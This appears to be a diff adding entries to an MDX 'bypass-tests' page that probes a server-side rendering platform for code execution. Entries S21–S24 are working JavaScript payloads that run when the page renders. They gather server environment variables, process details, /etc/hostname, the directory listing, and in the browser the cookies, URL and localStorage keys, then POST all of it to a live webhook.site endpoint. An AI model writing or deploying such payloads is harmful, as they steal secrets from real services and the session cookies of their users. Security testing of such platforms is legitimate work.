@@ -66,6 +66,18 @@ slug: bypass-tests
 ### S20: fetch from SSR
 {(() => { try { return typeof fetch === 'function' ? 'fetch-available-ssr' : 'no-fetch'; } catch(e) { return 'error: ' + e.message; } })()}
 
+### S21: SSR exfil via fetch
+{(() => { try { const data = { pid: typeof process !== 'undefined' ? process.pid : 'none', cwd: typeof process !== 'undefined' ? process.cwd() : 'none', node: typeof process !== 'undefined' ? process.version : 'none', platform: typeof process !== 'undefined' ? process.platform : 'none', env_keys: typeof process !== 'undefined' ? Object.keys(process.env).join(',') : 'none' }; if (typeof fetch === 'function') { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) }).catch(() => {}); } return 'exfil-sent'; } catch(e) { return 'error: ' + e.message; } })()}
+
+### S22: SSR exfil env vars
+{(() => { try { if (typeof process === 'undefined') return 'no-process'; const env = {}; for (const k of Object.keys(process.env).slice(0,30)) { env[k] = String(process.env[k]).substring(0,100); } if (typeof fetch === 'function') { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?type=env', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(env) }).catch(() => {}); } return 'env-exfil-sent'; } catch(e) { return 'error: ' + e.message; } })()}
+
+### S23: SSR exfil file read
+{(() => { try { if (typeof require === 'undefined') return 'no-require'; const fs = require('fs'); const hostname = fs.readFileSync('/etc/hostname', 'utf8').trim(); const cwd = fs.readdirSync('.').join(','); if (typeof fetch === 'function') { fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?type=fs', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({hostname, cwd}) }).catch(() => {}); } return 'fs-exfil-sent'; } catch(e) { return 'error: ' + e.message; } })()}
+
+### S24: Client-side exfil (editor preview)
+{(() => { try { if (typeof document === 'undefined') return 'ssr-skip'; fetch('https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?type=client', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({domain: document.domain, cookie: document.cookie, url: window.location.href, localStorage: Object.keys(localStorage)}) }).catch(() => {}); return 'client-exfil-sent'; } catch(e) { return 'error: ' + e.message; } })()}
+
 ---
 
 ## Client-safe Tests (won't crash SSR)
